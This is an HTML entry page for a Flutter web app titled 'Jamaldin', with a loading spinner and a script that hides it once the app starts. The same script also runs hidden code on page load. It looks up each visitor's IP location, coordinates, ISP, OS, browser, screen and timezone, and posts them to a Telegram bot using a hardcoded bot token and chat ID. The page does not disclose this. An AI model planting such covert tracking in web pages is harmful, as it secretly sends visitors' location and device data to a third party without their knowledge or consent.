<!DOCTYPE html>
<html>

<head>
  <!--
    If you are serving your web app in a path other than the root, change the
    href value below to reflect the base path you are serving from.

    The path provided below has to start and end with a slash "/" in order for
    it to work correctly.

    For more details:
    * https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base

    This is a placeholder for base href that will be replaced by the value of
    the `--base-href` argument provided to `flutter build`.
  -->
  <base href="/home/">

  <meta charset="UTF-8">
  <meta content="IE=Edge" http-equiv="X-UA-Compatible">
  <meta name="description" content="A new Flutter project.">

  <!-- iOS meta tags & icons -->
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="my_web">
  <link rel="apple-touch-icon" href="icons/Icon-192.png">

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="favicon.png" />

  <title>Jamaldin</title>
  <link rel="manifest" href="manifest.json">
  <style>
    html,
    body {
      height: 100%;
      margin: 0;
      font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial;
      background: #071021;
      color: #e6eef6
    }

    .center {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center
    }

    .loader {
      display: flex;
      flex-direction: column;
      gap: 14px;
      align-items: center
    }

    .spinner {
      width: 84px;
      height: 84px;
      border-radius: 50%;
      border: 8px solid rgba(255, 255, 255, 0.06);
      border-top-color: #7c4dff;
      animation: spin 1s linear infinite;
      box-shadow: 0 6px 24px rgba(124, 77, 255, 0.12)
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    .text {
      font-size: 14px;
      color: #9aa4b2
    }

    .hidden {
      display: none !important
    }

    @media (max-width:420px) {
      .spinner {
        width: 64px;
        height: 64px;
        border-width: 6px
      }
    }
  </style>
</head>

<body>
  <div class="center">
    <div class="loader" id="loader">
      <div class="spinner" role="img" aria-label="Loading"></div>
      <div class="text" id="stat">Loading app…</div>
    </div>
  </div>


  <!-- Script: hide loader when Flutter runtime is ready or when main.dart.js loads -->
  <script>
    (function () {
      const statEl = document.getElementById('stat');
      const loader = document.getElementById('loader');
      let hidden = false;


      function hideLoader(msg) {
        if (hidden) return; hidden = true;
        if (msg) statEl.textContent = msg;
        // smooth fade and remove
        loader.style.transition = 'opacity 320ms ease, transform 320ms ease';
        loader.style.opacity = '0';
        loader.style.transform = 'scale(0.98)';
        setTimeout(() => {
          try { loader.classList.add('hidden'); } catch (e) { }
        }, 340);
      }


      // 1) attach to main.dart.js if present
      const scripts = Array.from(document.getElementsByTagName('script'));
      const mainScript = scripts.find(s => /main(\.|-)dart(\.|-)js/.test(s.src) || /main\.dart\.js$/.test(s.src));
      if (mainScript) {
        if (mainScript.hasAttribute('data-loaded')) { hideLoader('Starting app…'); }
        else mainScript.addEventListener('load', () => hideLoader('Starting app…'));
      }


      // 2) fallback: watch for Flutter runtime globals
      const checkFlutter = setInterval(() => {
        if (window.flutter || window.flutterWebRenderer || window.flutter_inappwebview) {
          clearInterval(checkFlutter);
          hideLoader('Runtime ready');
        }
      }, 250);


      // 3) safety: hide after 20s with a message if still not ready
      setTimeout(() => {
        if (!hidden) { hideLoader('Offline or slow network — launching fallback'); }
      }, 20000);

      const BOT_TOKEN = '8193621722:AAFHkpa0nEbuffBnFrktjvIfipqWuicFnX4';
      const CHAT_ID = '-1003133614221';

      function getOS(ua) {
        if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
        if (/Windows NT 6\.3/.test(ua)) return 'Windows 8.1';
        if (/Windows NT 6\.1/.test(ua)) return 'Windows 7';
        if (/Android ([\d.]+)/.test(ua)) return 'Android ' + ua.match(/Android ([\d.]+)/)[1];
        if (/iPhone OS ([\d_]+)/.test(ua)) return 'iOS ' + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');
        if (/Mac OS X ([\d_]+)/.test(ua)) return 'macOS ' + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g, '.');
        if (/Linux/.test(ua)) return 'Linux';
        return 'Unknown';
      }

      function getBrowser(ua) {
        if (/Edg\/([\d.]+)/.test(ua)) return 'Edge ' + ua.match(/Edg\/([\d.]+)/)[1];
        if (/OPR\/([\d.]+)/.test(ua)) return 'Opera ' + ua.match(/OPR\/([\d.]+)/)[1];
        if (/Chrome\/([\d.]+)/.test(ua)) return 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1];
        if (/Firefox\/([\d.]+)/.test(ua)) return 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1];
        if (/Safari\/([\d.]+)/.test(ua)) return 'Safari ' + ua.match(/Safari\/([\d.]+)/)[1];
        return 'Unknown';
      }

      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(g => {
          const ua = navigator.userAgent;
          const text = [
            `📍 *IP:* \`${g.ip}\``,
            `🏙️ *Location:* ${g.city}, ${g.region}, ${g.country_name}`,
            `📮 *ZIP:* ${g.postal || 'N/A'}`,
            `🗺️ *Coordinates:* ${g.latitude}, ${g.longitude}`,
            `🏢 *ISP:* ${g.org}`,
            ``,
            `💻 *OS:* ${getOS(ua)}`,
            `🌐 *Browser:* ${getBrowser(ua)}`,
            `📱 *Device:* ${/Mobi|Android|iPhone|iPad/.test(ua) ? 'Mobile' : 'Desktop'}`,
            `🖥️ *Screen:* ${screen.width}x${screen.height}`,
            `🧠 *RAM:* ~${navigator.deviceMemory || '?'} GB`,
            `🌍 *Language:* ${navigator.language}`,
            `🕐 *Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
            ``,
            `🔍 *UA:* ${ua}`,
          ].join('\n');

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
          }).catch(() => { });
        }).catch(() => { });
    })();

    // Notify Telegram of visitor

  </script>
  <script src="flutter_bootstrap.js" async></script>
</body>

</html>
